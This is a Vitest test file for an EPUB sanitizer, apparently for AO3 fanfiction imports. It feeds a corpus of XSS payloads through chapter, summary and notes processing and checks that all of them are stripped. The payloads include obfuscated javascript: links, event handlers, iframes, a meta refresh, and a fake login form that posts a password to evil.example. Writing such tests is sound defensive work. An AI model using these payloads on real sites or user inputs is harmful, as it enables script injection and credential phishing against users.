import { describe, expect, it } from "vitest";
import { processEpub } from "../src";
import { safeHref } from "../src/sanitize";
import { ao3Epub } from "./helpers";

// Each payload sits next to a plain-text marker (alpha-N) that must survive.
const CORPUS = `
<p>alpha-1</p><script>alert('s1')</script>
<p>alpha-2 <img src=x onerror="alert('s2')"> beta-2</p>
<p onclick="alert('s3')">alpha-3</p>
<p><a href="javascript:alert('s4')">alpha-4</a></p>
<p><a href="jav&#x61;script:alert('s5')">alpha-5</a></p>
<p><a href=" JAVASCRIPT:alert('s6')">alpha-6</a></p>
<p><a href="data:text/html,&lt;script&gt;alert('s7')&lt;/script&gt;">alpha-7</a></p>
<iframe src="http://evil.example/s8">hidden-8</iframe><p>alpha-8</p>
<svg onload="alert('s9')"><circle r="1"/><p>hidden-9</p></svg><p>alpha-9</p>
<form action="http://evil.example/s10"><input name="password"/><button>Log in again</button></form><p>alpha-10</p>
<style>body { display: none }</style><p style="position: fixed; top: 0">alpha-11</p>
<p><img src="http://evil.example/x.png"/>alpha-12</p>
<meta http-equiv="refresh" content="0;url=http://evil.example/s13"/><p>alpha-13</p>
<base href="http://evil.example/"/><p>alpha-14</p>
<ScRiPt>alert('s15')</sCrIpT><P ONMOUSEOVER="alert('s15')">alpha-15</P><IMG SRC=x OnErRoR=alert('s15')>
<p><a href="https://ok.example/page?a=1&amp;b=2" onclick="alert('s16')" class="calibre9" style="color:red">alpha-16</a></p>
<p><a href="&#x6A;avascript&#58;alert('s17')">alpha-17</a> <a href="java&Tab;script:alert('s17')">beta-17</a></p>
<p><math><mi>hidden-18</mi></math>alpha-18 <object data="x.swf">hidden-18b</object><embed src="x.swf"/></p>
<div class="calibre3">alpha-19 inside a div that is never closed
`;

const chapter = `<div id="chapters" class="userstuff1"><h2 class="toc-heading">Payloads</h2>
<div class="userstuff2">${CORPUS}</div></div>`;

const FORBIDDEN = [
  /<script/i, /alert\(/i, /\son\w+\s*=/i, /javascript/i, /data:/i, /<iframe/i, /<svg/i, /<math/i,
  /<form/i, /<input/i, /<button/i, /<style/i, /style=/i, /class=/i, /evil\.example/i, /<meta/i,
  /<base/i, /<object/i, /<embed/i, /<img/i, /hidden-/,
];

function expectBalanced(html: string): void {
  const open = [...html.matchAll(/<(div|p|a|em|strong|blockquote)[\s>]/g)].length;
  const close = [...html.matchAll(/<\/(div|p|a|em|strong|blockquote)>/g)].length;
  expect(open).toBe(close);
}

describe("XSS corpus", () => {
  it("strips every payload from a chapter and keeps the text around it", async () => {
    const work = await processEpub(ao3Epub({ files: [{ name: "x_split_001.xhtml", body: chapter }], title: "Payloads" }));
    expect(work.chapters).toHaveLength(1);
    const html = work.chapters[0]!.html;
    for (const bad of FORBIDDEN) expect(html).not.toMatch(bad);
    for (let i = 1; i <= 19; i++) expect(html).toContain(`alpha-${i}`);
    expect(html).toContain("beta-2");
    expect(html).toContain("beta-17");
    expect(html).toContain(`<a href="https://ok.example/page?a=1&amp;b=2" rel="nofollow noopener ugc">alpha-16</a>`);
    expectBalanced(html);
  });

  it("strips payloads from the summary too", async () => {
    const work = await processEpub(ao3Epub({ summary: CORPUS }));
    for (const bad of FORBIDDEN) expect(work.summaryHtml).not.toMatch(bad);
    expect(work.summaryHtml).toContain("alpha-1");
    expectBalanced(work.summaryHtml!);
  });

  it("strips payloads from the notes and end notes", async () => {
    const work = await processEpub(ao3Epub({ notes: CORPUS, endNotes: CORPUS }));
    for (const html of [work.notesHtml, work.endNotesHtml]) {
      expect(html).not.toBeNull();
      for (const bad of FORBIDDEN) expect(html).not.toMatch(bad);
      expect(html).toContain("alpha-1");
      expectBalanced(html!);
    }
  });

  it("allows only http(s) hrefs, after decoding entities and stripping control characters", () => {
    expect(safeHref("https://example.org/a b")).toBe("https://example.org/a%20b");
    expect(safeHref(" HTTP://example.org/")).toBe("http://example.org/");
    expect(safeHref("https&#58;//example.org/")).toBe("https://example.org/");
    expect(safeHref("javascript:alert(1)")).toBeNull();
    expect(safeHref("jav\tascript:alert(1)")).toBeNull();
    expect(safeHref("java&Tab;script:alert(1)")).toBeNull();
    expect(safeHref("&#106;avascript:alert(1)")).toBeNull();
    expect(safeHref("vbscript:x")).toBeNull();
    expect(safeHref("//evil.example/")).toBeNull();
    expect(safeHref("chapter2.xhtml#x")).toBeNull();
    expect(safeHref("http://")).toBeNull();
  });
});
